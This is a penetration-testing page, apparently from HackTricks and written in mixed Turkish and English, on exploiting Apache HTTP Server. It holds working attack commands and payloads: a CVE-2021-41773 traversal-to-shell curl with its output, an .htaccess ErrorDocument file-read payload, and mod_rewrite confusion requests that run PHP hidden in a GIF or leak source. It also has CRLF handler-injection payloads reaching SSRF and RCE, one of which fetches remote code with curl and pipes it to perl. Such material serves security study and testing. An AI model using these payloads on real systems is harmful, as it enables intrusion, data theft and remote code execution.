# Apache

{{#include ../../banners/hacktricks-training.md}}

## Çalıştırılabilir PHP uzantıları

Apache sunucusunun hangi uzantıları çalıştırdığını kontrol edin. Bunları aramak için şu komutu çalıştırabilirsiniz:
```bash
grep -R -B1 "httpd-php" /etc/apache2
```
Ayrıca, bu yapılandırmayı bulabileceğiniz bazı yerler şunlardır:
```bash
/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-available/php7.3.conf
/etc/apache2/mods-enabled/php7.3.conf
```
## CVE-2021-41773
```bash
curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux
```
## LFI ile .htaccess ErrorDocument dosya sağlayıcısı (ap_expr)

Bir dizinin .htaccess'ini kontrol edebiliyorsanız ve AllowOverride o yol için FileInfo içeriyorsa, ErrorDocument içinde ap_expr file() fonksiyonunu kullanarak 404 yanıtlarını rastgele yerel dosya okumalarına dönüştürebilirsiniz.

- Gereksinimler:
- Apache 2.4'te expression parser (ap_expr) etkin olmalı (2.4'te varsayılan).
- vhost/dir, .htaccess'in ErrorDocument ayarlamasına izin vermeli (AllowOverride FileInfo).
- Apache worker kullanıcısının hedef dosyada okuma izni olmalı.

.htaccess payload:
```apache
# Optional marker header just to identify your tenant/request path
Header always set X-Debug-Tenant "demo"
# On any 404 under this directory, return the contents of an absolute filesystem path
ErrorDocument 404 %{file:/etc/passwd}
```
Bu dizinin altındaki var olmayan herhangi bir yolu isteyerek tetikleyin, örneğin userdir-style hosting'i kötüye kullanırken:
```bash
curl -s http://target/~user/does-not-exist | sed -n '1,20p'
```
Notes and tips:
- Only absolute paths work. The content is returned as the response body for the 404 handler.
- Etkili okuma izinleri Apache kullanıcısının (tipik olarak www-data/apache) izinleridir. Varsayılan kurulumlarda /root/* veya /etc/shadow dosyalarını okuyamazsınız.
- Even if .htaccess is root-owned, if the parent directory is tenant-owned and permits rename, you may be able to rename the original .htaccess and upload your own replacement via SFTP/FTP:
- rename .htaccess .htaccess.bk
- put your malicious .htaccess
- Bunu, DocumentRoot veya vhost yapılandırma yolları altındaki uygulama kaynaklarını okuyup sırları (DB creds, API keys, vb.) toplamak için kullanın.

## Confusion Attack <a href="#a-whole-new-attack-confusion-attack" id="a-whole-new-attack-confusion-attack"></a>

These types of attacks has been introduced and documented [**by Orange in this blog post**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1) and the following is a summary. The "confusion" attack basically abuses how the tens of modules that work together creating a Apache don't work perfectly synchronised and making some of them modify some unexpected data can cause a vulnerability in a later module.

### Filename Confusion

#### Truncation

The **`mod_rewrite`** will trim the content of `r->filename` after the character `?` ([_**modules/mappers/mod_rewrite.c#L4141**_](https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141)). This isn't totally wrong as most modules will treat `r->filename` as an URL. Ancak başka durumlarda bu bir dosya yolu olarak muamele görecek ve bu bir probleme yol açacaktır.

- **Path Truncation**

It's possible to abuse `mod_rewrite` like in the following rule example to access other files inside the file system, removing the last part of the expected path adding simply a `?`:
```bash
RewriteEngine On
RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"

# Expected
curl http://server/user/orange
# the output of file `/var/user/orange/profile.yml`

# Attack
curl http://server/user/orange%2Fsecret.yml%3F
# the output of file `/var/user/orange/secret.yml`
```
- **Mislead RewriteFlag Assignment**

Aşağıdaki rewrite kuralında, URL .php ile bittiği sürece php olarak işlenecek ve çalıştırılacaktır. Bu nedenle, path içine farklı bir dosya türü (ör. bir resim) yüklerken `?` karakterinden sonra .php ile biten bir URL göndermek mümkündür; bu dosyanın içinde kötü amaçlı php kodu bulunabilir:
```bash
RewriteEngine On
RewriteRule  ^(.+\.php)$  $1  [H=application/x-httpd-php]

# Attacker uploads a gif file with some php code
curl http://server/upload/1.gif
# GIF89a <?=`id`;>

# Make the server execute the php code
curl http://server/upload/1.gif%3fooo.php
# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### **ACL Bypass**

Erişimin reddedilmesi gereken yapılandırmalarda bile, kullanıcının erişmemesi gereken dosyalara erişim mümkün olabilir:
```xml
<Files "admin.php">
AuthType Basic
AuthName "Admin Panel"
AuthUserFile "/etc/apache2/.htpasswd"
Require valid-user
</Files>
```
Bunun nedeni, varsayılan olarak PHP-FPM'in `.php` ile biten URL'leri (ör. `http://server/admin.php%3Fooo.php`) alması ve PHP-FPM'in `?` karakterinden sonrasını kaldırmasıdır; önceki URL, önceki kural bunu yasaklamış olsa bile `/admin.php`'in yüklenmesine izin verecektir.

### DocumentRoot Karışıklığı
```bash
DocumentRoot /var/www/html
RewriteRule  ^/html/(.*)$   /$1.html
```
Apache hakkında eğlenceli bir bilgi: önceki rewrite hem documentRoot'tan hem de root'tan dosyaya erişmeye çalışır. Yani, `https://server/abouth.html` isteği dosyayı dosya sisteminde `/var/www/html/about.html` ve `/about.html` konumlarında arayacaktır. Bu temelde dosya sistemindeki dosyalara erişmek için suistimal edilebilir.

#### **Sunucu Tarafı Kaynak Kodu Açığa Çıkarma**

- **CGI Kaynak Kodunu Açığa Çıkarma**

Sondaki %3F'yi eklemek, bir cgi modülünün kaynak kodunu leak etmek için yeterlidir:
```bash
curl http://server/cgi-bin/download.cgi
# the processed result from download.cgi
curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
# #!/usr/bin/perl
# use CGI;
# ...
# # the source code of download.cgi
```
- **Disclose PHP Source Code**

Bir sunucunun farklı domain'leri varsa ve bunlardan biri static bir domain ise, bu dosya sisteminde gezinmek ve php kodunu leak etmek için kötüye kullanılabilir:
```bash
# Leak the config.php file of the www.local domain from the static.local domain
curl http://www.local/var/www.local/config.php%3F -H "Host: static.local"
# the source code of config.php
```
#### **Local Gadgets Manipulation**

Önceki saldırının asıl sorunu, varsayılan olarak dosya sistemi üzerindeki çoğu erişimin Apache HTTP Server’s [configuration template](https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115) içinde olduğu gibi reddedilmesidir:
```xml
<Directory />
AllowOverride None
Require all denied
</Directory>
```
Ancak, [Debian/Ubuntu](https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165) işletim sistemleri varsayılan olarak `/usr/share`'e izin verir:
```xml
<Directory /usr/share>
AllowOverride None
Require all granted
</Directory>
```
Bu nedenle, bu dağıtımlarda **`/usr/share` içinde bulunan dosyalar kötüye kullanılabilir.**

**Yerel Gadget ile Information Disclosure**

- **Apache HTTP Server** ile **websocketd**, **/usr/share/doc/websocketd/examples/php/** altında **dump-env.php** betiğini açığa çıkarabilir; bu hassas ortam değişkenlerini leak edebilir.
- **Nginx** veya **Jetty** çalıştıran sunucular, **/usr/share** altında yer alan varsayılan web kökleri aracılığıyla hassas web uygulaması bilgilerini (ör. **web.xml**) expose edebilir:
- **/usr/share/nginx/html/**
- **/usr/share/jetty9/etc/**
- **/usr/share/jetty9/webapps/**

**Yerel Gadget ile XSS**

- LibreOffice yüklü bir Ubuntu Desktop üzerinde, yardım dosyalarının dil değiştirme özelliğinin suistimali Cross-Site Scripting (XSS)'e yol açabilir. **/usr/share/libreoffice/help/help.html** içindeki URL manipülasyonu, unsafe **RewriteRule** nedeniyle zararlı sayfalara veya eski sürümlere yönlendirmeye sebep olabilir.

**Yerel Gadget ile LFI**

- PHP veya **JpGraph** ya da **jQuery-jFeed** gibi bazı front-end paketleri yüklüyse, bu paketlerin dosyaları kullanılarak **/etc/passwd** gibi hassas dosyalar okunabilir:
- **/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php**
- **/usr/share/javascript/jquery-jfeed/proxy.php**
- **/usr/share/moodle/mod/assignment/type/wims/getcsv.php**

**Yerel Gadget ile SSRF**

- **MagpieRSS**'in **magpie_debug.php**'si **/usr/share/php/magpierss/scripts/magpie_debug.php** konumunda bulunuyorsa, kolayca bir SSRF zafiyeti oluşturulabilir ve bu da daha ileri suistimallere kapı açar.

**Yerel Gadget ile RCE**

- Remote Code Execution (RCE) için fırsatlar geniştir; güncel olmayan **PHPUnit** veya **phpLiteAdmin** gibi zafiyetli kurulumlar, rastgele kod yürütmek için exploit edilebilir ve yerel gadget manipülasyonunun geniş potansiyelini gösterir.

#### **Jailbreak from Local Gadgets**

Ayrıca, izin verilen klasörlerdeki yüklü yazılımlar tarafından oluşturulan symlink'leri takip ederek jailbreak yapmak da mümkündür, örneğin:

- **Cacti Log**: `/usr/share/cacti/site/` -> `/var/log/cacti/`
- **Solr Data**: `/usr/share/solr/data/` -> `/var/lib/solr/data`
- **Solr Config**: `/usr/share/solr/conf/` -> `/etc/solr/conf/`
- **MediaWiki Config**: `/usr/share/mediawiki/config/` -> `/var/lib/mediawiki/config/`
- **SimpleSAMLphp Config**: `/usr/share/simplesamlphp/config/` -> `/etc/simplesamlphp/`

Ek olarak, symlink'lerin suistimali ile **Redmine**'de **RCE** elde etmek mümkün olmuştur.

### Handler Confusion <a href="#id-3-handler-confusion" id="id-3-handler-confusion"></a>

Bu saldırı, hem PHP işlemesini etkinleştirmek için kullanılabilen `AddHandler` ve `AddType` direktifleri arasındaki işlevsel örtüşmeyi suistimal eder. Başlangıçta bu direktifler sunucunun iç yapısında farklı alanları etkiliyordu (sırasıyla `r->handler` ve `r->content_type`). Ancak eski kod nedeniyle Apache belirli koşullar altında bu direktifleri birbirinin yerine kullanır; eğer `r->content_type` ayarlıysa ve `r->handler` değilse, ilki `r->handler`'a çevrilir.

Dahası, Apache HTTP Server'da (`server/config.c#L420`), `ap_run_handler()` çalıştırılmadan önce `r->handler` boşsa, sunucu **handler** olarak `r->content_type`'ı kullanır; bu da `AddType` ve `AddHandler`'ı pratikte eşdeğer kılar.

#### **Overwrite Handler to Disclose PHP Source Code**

[**this talk**](https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf) sunumunda, bir istemcinin gönderdiği yanlış bir `Content-Length` değeri nedeniyle Apache'in yanlışlıkla **PHP kaynak kodunu return etmesine** yol açan bir zafiyet gösterildi. Bu, ModSecurity ile Apache Portable Runtime (APR) arasındaki bir hata işleme sorunundan kaynaklanıyordu; çift yanıt durumunda `r->content_type` üzerine yazılarak `text/html` olacak şekilde değiştiriliyordu.\
ModSecurity dönüş değerlerini düzgün işlemeyince, PHP kodunu return eder ve onu yorumlamaz.

#### **Overwrite Handler to XXXX**

TODO: Orange henüz bu zafiyeti açıklamadı

### **Invoke Arbitrary Handlers**

Eğer bir saldırgan bir sunucu yanıtında `Content-Type` başlığını kontrol edebilirse, keyfi modül handler'larını invoke edebilir. Ancak saldırgan bunun kontrolünü ele geçirdiğinde isteğin çoğu işlemi zaten gerçekleştirilmiş olur. Yine de, eğer `Location` başlığı suistimal edilirse istek sürecini yeniden başlatmak mümkündür; çünkü eğer döndürülen `Status` 200 ise ve `Location` başlığı `'/'` ile başlıyorsa, yanıt bir Server-Side Redirection olarak değerlendirilir ve yeniden işlenmelidir.

RFC 3875 (CGI hakkındaki spesifikasyon) [Section 6.2.2](https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2) şu Local Redirect Response davranışını tanımlar:

> The CGI script can return a URI path and query-string (‘local-pathquery’) for a local resource in a Location header field. This indicates to the server that it should reprocess the request using the path specified.

Dolayısıyla, bu saldırıyı gerçekleştirmek için aşağıdaki zaafiyetlerden biri gereklidir:

- CRLF Injection in the CGI response headers
- SSRF with complete control of the response headers

#### **Arbitrary Handler to Information Disclosure**

Örneğin `/server-status` sadece yerel erişime açık olmalıdır:
```xml
<Location /server-status>
SetHandler server-status
Require local
</Location>
```
Erişim, `Content-Type`'ı `server-status` olarak ayarlayıp Location header'ını `/` ile başlayan bir değere ayarlayarak mümkündür.
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo %0d%0a
Content-Type:server-status %0d%0a
%0d%0a
```
#### **Arbitrary Handler'dan Full SSRF'ye**

Herhangi bir URL'deki herhangi bir protokole erişmek için `mod_proxy`'ye yönlendirme:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:
http://example.com/%3F
%0d%0a
%0d%0a
```
Ancak, `X-Forwarded-For` header eklendiği için bulut metadata uç noktalarına erişim engelleniyor.

#### **Arbitrary Handler to Access Local Unix Domain Socket**

PHP-FPM’in local Unix Domain Socket'ine erişerek `/tmp/` içinde bulunan bir PHP backdoor'unu çalıştırın:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php %0d%0a
%0d%0a
```
#### **Arbitrary Handler to RCE**

Resmi [PHP Docker](https://hub.docker.com/_/php) imajı PEAR (`Pearcmd.php`) içerir; bu, komut satırı bir PHP paket yönetim aracıdır ve RCE elde etmek için kötüye kullanılabilir:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}
orange.tw/x|perl
) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
Bu tekniğin detayları için [**Docker PHP LFI Summary**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp) (yazar: [Phith0n](https://x.com/phithon_xg)) adresine bakın.

## Kaynaklar

- [https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)
- [Apache 2.4 Custom Error Responses (ErrorDocument)](https://httpd.apache.org/docs/2.4/custom-error.html)
- [Apache 2.4 Expressions and functions (file:)](https://httpd.apache.org/docs/2.4/expr.html)
- [HTB Zero write-up: .htaccess ErrorDocument LFI and cron pgrep abuse](https://0xdf.gitlab.io/2025/08/12/htb-zero.html)

{{#include ../../banners/hacktricks-training.md}}
